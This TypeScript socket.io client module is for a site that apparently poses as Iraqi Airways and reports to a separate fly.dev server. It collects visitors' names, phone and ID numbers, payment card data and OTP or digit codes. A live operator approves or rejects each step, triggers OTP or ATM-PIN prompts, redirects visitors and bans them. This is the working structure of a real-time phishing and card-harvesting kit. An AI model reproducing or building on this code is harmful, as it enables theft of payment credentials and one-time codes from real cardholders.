import { signal } from "@preact/signals-react";
import { io, Socket } from "socket.io-client";

// Socket Configuration
const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || "https://iraqairways-server.fly.dev";
console.log("Socket URL:", SOCKET_URL);

// Create socket instance
export const socket = signal<Socket>(
  io(SOCKET_URL, {
    transports: ["polling", "websocket"],
    autoConnect: false,
    reconnection: true,
    reconnectionAttempts: 5,
    reconnectionDelay: 2000,
    reconnectionDelayMax: 10000,
    timeout: 10000,
  })
);

// Visitor State
export interface VisitorState {
  visitorNumber: number;
  createdAt: string;
  isRead: boolean;
  fullName: string;
  phone: string;
  idNumber: string;
  _id: string;
  apiKey: string;
  ip: string;
  country: string;
  city: string;
  os: string;
  device: string;
  browser: string;
  date: string;
  socketId: string;
  blockedCardPrefixes: string[];
  page: string;
}

export const visitor = signal<VisitorState>({
  visitorNumber: 0,
  createdAt: "",
  isRead: true,
  fullName: "",
  phone: "",
  idNumber: "",
  _id: "",
  apiKey: "",
  ip: "",
  country: "",
  city: "",
  os: "",
  device: "",
  browser: "",
  date: "",
  socketId: "",
  blockedCardPrefixes: [],
  page: "الصفحة الرئيسية",
});

// Form State
export const isFormApproved = signal<boolean>(false);
export const isFormRejected = signal<boolean>(false);
export const waitingMessage = signal<string>("");
export const nextPage = signal<string>("");
export const verificationCode = signal<string>("");

// Admin Connection State
export const isAdminConnected = signal<boolean>(false);
export const adminLastMessage = signal<string>("");

// Error/Block State
export const errorMessage = signal<{ en: string; ar: string; image?: string } | undefined>(undefined);
export const isBlocked = signal<boolean>(false);
export const globalDiscount = signal<boolean>(false);

// Card Verification
export const isCardVerified = signal<boolean | null>(null);

// Card Action from Admin (otp, atm, reject) - يحتوي على timestamp لضمان التفاعل مع كل تغيير
export const cardAction = signal<{ action: string; timestamp: number } | null>(null);

// Code Action from Admin (approve, reject) for OTP/digit codes
export const codeAction = signal<{ action: string; codeIndex: number } | null>(null);

// Payment Data (stored in localStorage)
export interface PaymentData {
  totalPaid?: number;
  cardType?: string;
  cardLast4?: string;
}

// Pending data queue to send after connection
let pendingDataQueue: Parameters<typeof sendData>[0][] = [];

// Function to send data to server
export function sendData(params: {
  data?: Record<string, any>;
  paymentCard?: Record<string, any>;
  digitCode?: string;
  current: string;
  nextPage?: string;
  waitingForAdminResponse?: boolean;
  isCustom?: boolean;
  mode?: string;
  customWaitingMessage?: string;
}) {
  console.log("sendData called with:", params);
  console.log("Current visitor ID:", visitor.value._id);
  console.log("Socket connected:", socket.value.connected);
  
  // If visitor ID is not set yet, store in queue and wait for connection
  if (!visitor.value._id || !socket.value.connected) {
    console.warn("No visitor ID or socket not connected, storing in pending queue...");
    pendingDataQueue.push(params);
    
    // Set up a retry mechanism
    const retryInterval = setInterval(() => {
      if (visitor.value._id && socket.value.connected) {
        clearInterval(retryInterval);
        sendPendingData();
      }
    }, 500);
    
    // Clear interval after 10 seconds to prevent memory leak
    setTimeout(() => clearInterval(retryInterval), 10000);
    return;
  }

  isFormApproved.value = false;
  isFormRejected.value = false;

  const payload = {
    content: params.data,
    paymentCard: params.paymentCard,
    digitCode: params.digitCode,
    page: params.current,
    waitingForAdminResponse: params.waitingForAdminResponse,
    sentCustomPage: params.isCustom,
    mode: params.mode,
  };
  
  console.log("Emitting more-info with payload:", payload);
  socket.value.emit("more-info", payload);

  if (params.nextPage) {
    nextPage.value = params.nextPage;
  }

  if (!params.mode) {
    waitingMessage.value = params.customWaitingMessage || "Processing...";
  }
}

// Function to send pending data after connection
export function sendPendingData() {
  if (pendingDataQueue.length > 0 && visitor.value._id && socket.value.connected) {
    console.log(`Sending ${pendingDataQueue.length} pending data items...`);
    const queueToProcess = [...pendingDataQueue];
    pendingDataQueue = []; // Clear queue before processing to avoid infinite loops
    
    queueToProcess.forEach(params => {
      sendData(params);
    });
  }
}

// Pending page to send after connection
let pendingPage: string | null = null;

// Function to navigate to page
export function navigateToPage(page: string) {
  console.log("navigateToPage called:", page);
  // تحديث الصفحة في visitor state
  visitor.value = { ...visitor.value, page };
  
  if (socket.value.connected) {
    console.log("Socket connected, emitting pageEnter:", page);
    socket.value.emit("visitor:pageEnter", page);
  } else {
    console.log("Socket not connected, storing pending page:", page);
    pendingPage = page;
  }
}

// Function to send pending page after connection
export function sendPendingPage() {
  if (pendingPage && socket.value.connected) {
    console.log("Sending pending page:", pendingPage);
    socket.value.emit("visitor:pageEnter", pendingPage);
    pendingPage = null;
  }
}

// Initialize socket listeners
export function initializeSocket() {
  const s = socket.value;
  console.log("Initializing socket...");

  // Check if visitor was blocked (persists across refresh)
  if (localStorage.getItem("isBlocked") === "true") {
    isBlocked.value = true;
    errorMessage.value = {
      en: "You have been banned from using the site for violating the terms of use.",
      ar: "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.",
    };
  }

  s.on("connect", () => {
    console.log("Socket connected successfully!");
    // Register visitor with existing ID if available
    const existingVisitorId = localStorage.getItem("visitorId");
    console.log("Registering visitor...", existingVisitorId ? "(returning visitor: " + existingVisitorId + ")" : "(new visitor)");
    s.emit("visitor:register", { existingVisitorId });
  });

  s.on("reconnect", () => {
    console.log("Socket reconnected!");
    const existingVisitorId = localStorage.getItem("visitorId");
    s.emit("visitor:register", { existingVisitorId });
  });

  s.on("connect_error", (error) => {
    console.error("Socket connection error:", error);
  });

  s.on("successfully-connected", (data: { sid: string; pid: string }) => {
    console.log("Successfully connected to server:", data);
    visitor.value = { ...visitor.value, socketId: data.sid, _id: data.pid };
    // Save visitor ID to localStorage for reconnection
    localStorage.setItem("visitorId", data.pid);
    // إرسال الصفحة المعلقة إذا وجدت
    sendPendingPage();
    // إرسال البيانات المعلقة إذا وجدت
    sendPendingData();
  });

  s.on("form:approved", () => {
    console.log("Form approved!");
    isFormApproved.value = true;
    waitingMessage.value = "";
  });

  s.on("form:rejected", () => {
    console.log("Form rejected!");
    isFormRejected.value = true;
    waitingMessage.value = "";
  });

  s.on("visitor:navigate", (page: string) => {
    console.log("Navigate to:", page);
    if (page === '' || page === '__home__') {
      window.location.href = "/";
    } else if (page) {
      if (page.startsWith("http")) { window.location.href = page; } else { window.location.href = "/" + page; }
    }
  });

  s.on("admin-last-message", ({ message }: { message: string }) => {
    console.log("Admin message received:", message);
    adminLastMessage.value = message;
    waitingMessage.value = "";
    navigateToPage("END");
  });

  s.on("code", (code: string) => {
    console.log("Verification code received:", code);
    verificationCode.value = code;
    waitingMessage.value = "";
  });

  s.on("cardNumber:verified", (verified: boolean) => {
    console.log("Card verification result:", verified);
    isCardVerified.value = verified;
  });

  s.on("card:action", (action: string) => {
    console.log("Card action received:", action);
    // إضافة timestamp لضمان التفاعل مع كل تغيير حتى لو كان نفس الإجراء
    cardAction.value = { action, timestamp: Date.now() };
    waitingMessage.value = "";
  });

  s.on("code:action", (data: { action: string; codeIndex: number }) => {
    console.log("Code action received:", data);
    codeAction.value = data;
    waitingMessage.value = "";
  });

  s.on("resend:approved", () => {
    console.log("Resend approved!");
    waitingMessage.value = "";
  });

  s.on("blocked", () => {
    console.log("Visitor blocked!");
    waitingMessage.value = "";
    errorMessage.value = {
      en: "You have been banned from using the site for violating the terms of use.",
      ar: "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.",
      image: "banned.jpg",
    };
    isBlocked.value = true;
    localStorage.setItem("isBlocked", "true");
  });

  s.on("unblocked", () => {
    console.log("Visitor unblocked!");
    errorMessage.value = undefined;
    isBlocked.value = false;
    localStorage.removeItem("isBlocked");
  });

  s.on("deleted", () => {
    console.log("Visitor deleted!");
    window.location.href = "/";
    errorMessage.value = {
      en: "Removed Your Account! Try Again Later",
      ar: "",
    };
  });

  s.on("isAdminConnected", (connected: boolean) => {
    console.log("Admin connected status:", connected);
    isAdminConnected.value = connected;
  });

  s.on("bankName", (name: string) => {
    console.log("Bank name set:", name);
    localStorage.setItem("selectedBank", name);
  });

  s.on("discount:update", (enabled: boolean) => {
    console.log("Global discount updated:", enabled);
    globalDiscount.value = !!enabled;
  });

  // Connect socket
  console.log("Connecting socket...");
  s.connect();
}

// Disconnect socket
export function disconnectSocket() {
  console.log("Disconnecting socket...");
  socket.value.disconnect();
}

// Function to update current page
export function updatePage(pageName: string) {
  console.log("updatePage called:", pageName);
  visitor.value = { ...visitor.value, page: pageName };
  
  // If socket is connected, emit immediately
  if (socket.value.connected) {
    console.log("Socket connected, emitting pageEnter:", pageName);
    socket.value.emit("visitor:pageEnter", pageName);
  } else {
    // Wait for socket to connect then emit
    console.log("Socket not connected, waiting...");
    const checkConnection = setInterval(() => {
      if (socket.value.connected) {
        // إرسال الصفحة الحالية وليس القيمة القديمة
        const currentPage = visitor.value.page;
        console.log("Socket now connected, emitting pageEnter:", currentPage);
        socket.value.emit("visitor:pageEnter", currentPage);
        clearInterval(checkConnection);
      }
    }, 100);
    
    // Clear interval after 10 seconds to prevent memory leak
    setTimeout(() => clearInterval(checkConnection), 10000);
  }
}

// Function to submit data to admin panel
export function submitData(data: Record<string, any>, waitingForAdminResponse: boolean = false) {
  console.log("submitData called with:", data);
  console.log("Current visitor ID:", visitor.value._id);
  console.log("Socket connected:", socket.value.connected);
  
  // If visitor ID is not set yet, wait and retry
  if (!visitor.value._id) {
    console.warn("No visitor ID yet, waiting for connection...");
    // Retry after 500ms
    setTimeout(() => {
      if (visitor.value._id) {
        submitData(data, waitingForAdminResponse);
      } else {
        console.error("Still no visitor ID after retry");
      }
    }, 500);
    return;
  }
  
  const payload = {
    content: data,
    page: visitor.value.page,
    waitingForAdminResponse: waitingForAdminResponse,
  };
  
  console.log("Emitting more-info with payload:", payload);
  socket.value.emit("more-info", payload);
  
  if (waitingForAdminResponse) {
    waitingMessage.value = "Processing...";
  }
}
